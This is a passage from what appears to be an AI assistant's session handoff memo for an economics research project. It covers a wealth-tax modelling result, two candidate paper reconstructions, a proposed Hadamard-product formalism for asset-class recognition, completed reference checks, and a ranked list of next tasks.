> it — and at a confiscatory rate on flow the multiplier is bounded above by 1, so **no power-law
> tail exists at all.** This explains the paper's own table (Gini 0.222 vs 0.125 at κ ≈ 0.10) and it
> reverses the standard wealth-tax-is-stronger prior.

**⚠ TWO THINGS BEFORE THIS SHIPS.** (i) **Nobody has searched whether this is already known** —
the optimal-taxation-with-Pareto-tails literature is where it would live, and it is the one search
that must happen before the claim is made in print. (ii) `wt077` prints `unlevied Var[log a] = nan`
— a log of negative values at the far left of the η grid. Cosmetic, in the last block only, and
**not** load-bearing for any number above. Clamp it.

## 2 · THE PLAN — `docs/ROADS-001-two-reconstructions.md`, READ IT SECOND

Two alternative papers built from verified material, with spines, abstracts and titles.

- **ROAD ONE (Paper II) — "the shape of the bite, not its size."** All five findings, *including the
  two Jason thought were failures*, become instances of one principle: a levy changes the
  distribution only insofar as it changes the **shape** of the growth multiplier. ρ, the exemption
  threshold and periodicity are trim (they cannot change shape, and don't); scaling vs truncation is
  structure. **WT-077 has now verified the load-bearing claim.** This road is unblocked.
- **ROAD TWO (Paper III) — "Limitation 4 is the paper."** φ reaches any observable only as **φδ**, so
  timeliness and durability are not separately identified from a reported series. That is a
  constraint on *the field's own instruments* — Basu, C_Score, Ball–Shivakumar, Givoly–Hayn, DELR —
  not on this framework. **And the failed pre-registration becomes the theorem's worked example:**
  the tier test varied φ across classes whose δ also varies, which is exactly the confounded design
  the theorem forbids, and §4.2 said so on the page before. *The honest sentence is that the confound
  was derivable before the registration was written and was not derived.* The whole crash-risk
  section moves to Abandoned Approaches intact, where it is a real contribution and the trailer for
  a later paper.

**`wealthTensor-10`'s recommendation was Road Two first.** Jason has not ruled. **Ask, then write
prose** — do not produce another memo about which to pick.

## 3 · THE TENSOR — OPEN, AND JASON'S, AND `wealthTensor-10` GOT THIS PARTLY WRONG

The reception argument against "tensor" was **word count**, and Jason is right that word count is a
poor proxy for the depth of an idea. **The strong argument is different and it is not "drop it":**

> The object in the paper is an ordered pair (E, C) and a scalar ratio. No indices, no basis, no
> transformation law, no rank, no contraction. **The word names an object the paper has not
> constructed.** That is what reads as crank-adjacent — not the frequency, the *absence of the
> structure*.

**But there is very likely a real tensor here, and Jason is the person who can build it.** With one
firm and one asset, (E, C) is a pair. **The tensor structure appears the moment there are multiple
asset classes with different (φᵢ, δᵢ)** — the reporting layer becomes a linear operator from
physical states to reported states, and the transfer-function language in §1 is already operator
language. *Note what that means: PRE-001's tier ordering across GAAP classes was a test of the
multi-index structure, run before the multi-index object existed.*

**Recommendation, not a ruling: drop it from THIS title and make it a later paper's title, earned.**
Statistical mechanics is Jason's declared special expertise and the contribution he most wants to
make. It should be made where it can be defended, not asserted in a title. **He said he will go with
our judgement and would be saddened to lose it — so if a session can construct the operator honestly,
that is worth more than any edit in this handoff.**


### 3b · **THE SYNTHESIS — Jason's Hadamard instinct, and why it means the tensor does NOT get cut**

*Added at the very end of `wealthTensor-10`, from Jason's own reading, and it resolves §3 above.*

His instinct: with multiple asset classes the shortest mathematical path is a **Hadamard product
across a tensor**, and decomposing to matrices would be inefficient. **He is right, and the reason
matters more than the efficiency.**

Index the asset classes *i*. Each carries its own **(φᵢ, δᵢ, αᵢ, θᵢ)**, and §4's recursion becomes

> **C**(t+1) = **C**(t) + **φ** ⊙ Δ**E** + **α** ⊙ **gap**(t)

**Elementwise, because each class's filter acts only on its own class.** The Hadamard product is not
a notational convenience here — it is the *statement that the reporting layer is diagonal in class
space*. Computationally it is O(n) against a matrix product's O(n²); structurally it is the claim
that recognition in one class does not force recognition in another.

**And that is exactly why the tensor belongs in ROAD TWO rather than in a later paper.**

The φδ non-identification result, stated for one class, is a scalar remark: *you cannot recover φ
without knowing δ.* Stated on the diagonal it becomes the corollary that does all the work:

> **The observable ranking of asset classes is the ranking of φ ⊙ δ, not of φ.** Two classes cannot
> be ordered by observability from reported series unless their degradation rates are known and
> divided out.

**That is PRE-001's registered hypothesis, and it is why PRE-001 could not have succeeded.** The
registration ordered classes by φ while δ varied freely across them — and the Hadamard form is the
one-line proof that the design was reading φ⊙δ the whole time. *The formalism Jason wanted to
contribute is the formalism in which his own null becomes a theorem's worked example.*

**So the tensor is not cut. It is promoted from an adjective in a title to the notation the result is
stated in** — and it is load-bearing, because without the class index the theorem's sharpest
corollary cannot even be written.

**And the off-diagonal is the next paper, with a test attached.** Real GAAP couples the classes: a
goodwill test under ASC 350-20 runs at the *reporting-unit* level, and the triggering event that
forces an ASC 360 recoverability screen on PP&E is frequently the same event. So the honest
statement is that the diagonal model is an **assumption**, not a fact — and it is a *testable* one:

> **The diagonal (Hadamard) model predicts recognition events are independent across asset classes
> within a firm. A coupled model predicts they cluster in firm-quarters.** Co-occurrence of
> impairment charges across classes, against an independence null, is a test that needs **no
> observability proxy, no bridge from φ to a GAAP category, and no new data** — the 688 events
> already collected are enough to look.

*That is the failure mode that killed PRE-001 and PRE-002 routed around entirely, and it should be
registered before its instrument is coded (WT-052).*

## 4 · DONE IN `wealthTensor-10`

- **`docs/REFERENCE-POLICY.md`** — portable. Three acts (cite/characterise/quote); a **fifth pass**
  (read-status), because passes 1–4 are all silently satisfied by a work nobody opened; a **fourth
  mark ✓◐** for cited-but-not-read; the free-and-legal access playbook; forum-lead-is-not-a-source.
- **`scripts/provenance_check.py`** — a filename is not a provenance. Caught two PDFs named
  `JST_10.2307_*.pdf` that were Preview re-exports of shadow-library copies, each carrying its
  ancestor's md5 in its own Title. **Severity is tiered** because the first legitimate file it saw,
  it flagged. Exit 1 on flags.
- **`POSITIONING-002` §6 — three of four discharged at source.** Kim & Zhang and Kim/Wang/Zhang read
  in full and greped; Zhu abstract-only (**✓◐**, no legitimate open copy exists).
  **KWZ manuscript p.9 killed the positioning claim for the third time in five sessions:** *"does not
  depend on the existence of any rational moral hazard behavior… the interests of the manager and
  outside investors are perfectly aligned."* What replaced it is the three-cell grid in §9.2 — the
  wedge lives in an **incentive**, a **belief**, or **the measurement rule**, and §4 owns the third.
- **`docs/REVIEW-004-pre-posting-dossier.md`** and a 62-page reading-draft PDF. *Useful, and exactly
  the umpire artefact WT-078 now forbids as a final deliverable.*
- **ADR-001 addendum 7** — Paper I folds into IV; corpus is **three** preprints; DoD amended.
- **Front matter** — `jason@braatzresearch.com` in all three papers, plus a declaration of interest
  (accounting-software employment) and an AI-assistance disclosure naming Claude Opus 5 at high
  effort. **Jason will use the DAISY template for the final version.**
- **§6.3 rewritten** on his instruction: *"That argument is withdrawn, on three counts a sceptical
  reader would have reached first."*
- Two stale lines fixed in Paper III's reference apparatus ("three passes" over a list of four).

## 5 · MISSION, RANKED

1. **ASK which road, then WRITE THE PROSE.** A straw-man revision of the chosen paper, in the file,
   in the repo. Not a memo. **This is the whole at-bat** (WT-079).
2. **Search whether WT-077's truncation-vs-scaling result is already published** before it is claimed.
3. **The survivals ledger.** Both papers report every test run and never report what survived one.
   A drafted table for Paper III is in `ROADS-001`. *"A paper that reports only its failures gives a
   reader no way to weigh them."*
4. **Ryan (1995) + erratum + Beaver & Ryan (2000)** — three JSTOR clicks, Jason's JPASS trial,
   `~/Desktop/downloads/DOWNLOAD-QUEUE.md`. Run `scripts/provenance_check.py` on whatever lands.
   **Basu (1997) is closed everywhere; the author route is the play.**
5. **The tensor** (§3 above).
6. **Move the methodological inoculation.** The passage at ~line 1074 of `paper-III.md` — Mayo cited
   at origin with the critics' volume beside it — is thirty pages after §5, which is where the
   pre-registration apparatus is exposed. **Do not take a side in the use-novelty dispute; the paper
   deliberately doesn't, and it is right not to.**
7. **The end-to-end corpus test** — still undesigned after three sessions. `ROADS`/`REVIEW-004` §E3
   gives five failure modes and a diagnostic for each; mode 1 (*is there one model in which ρ and φ
   are the same quantity?*) is the live one.

## 6 · WHAT NOT TO DO

- **Do not run a pure-teardown agent pass.** WT-078. If an agent is spawned, its brief includes the
  corrective and the whitespace, or it does not ship.
- **Do not hand Jason a ranked list of problems as a deliverable.** WT-079.
- **Do not invoke Mayo, severity or error-statistical philosophy as a *warrant*.** Jason knows that
  literature deeply, the dispute is live (use-novelty, double-counting, fallibilism vs
  foundationalism), and **the paper deliberately takes the practice while declining the philosophy.**
  Justify pre-registration and negative controls *pragmatically*. `wealthTensor-10` got this wrong
  and was corrected.
- **Do not ask him to submit anything.** §4d. Nothing ships until the corpus is done.
